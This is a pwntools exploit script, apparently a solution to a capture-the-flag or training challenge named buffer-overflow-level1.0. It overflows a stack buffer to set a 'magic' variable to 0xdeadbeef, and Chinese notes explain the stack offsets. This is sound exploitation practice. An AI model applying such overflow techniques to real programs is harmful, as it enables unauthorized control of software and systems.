from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level1.0"
p = process(challenge_path)

# create string
shellcode="123456789012345612345678"+chr(0xef)+chr(0xbe)+chr(0xad)+chr(0xde)
p.sendlineafter("Give me your input\n",shellcode)

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码 gdb反汇编main
局部变量放在栈区，栈区地址是从高到低，rbp是基址指针，%rbp-0x8是magic地址，往高处读，小端方式存
然后%rbp-0x20是buf的开始地址，可以看到两者差了0x18而不是0x10（大概率是为了地址对齐？按双字节对齐）
输入字符串大于0x18位之后溢出会覆盖magic,使其值为0xdeadbeef

关于局部变量在栈区的地址分配——两个变量之间有没有空字节要看具体编译器的处理
https://blog.csdn.net/Ye_Ming_OUC/article/details/123441066

'''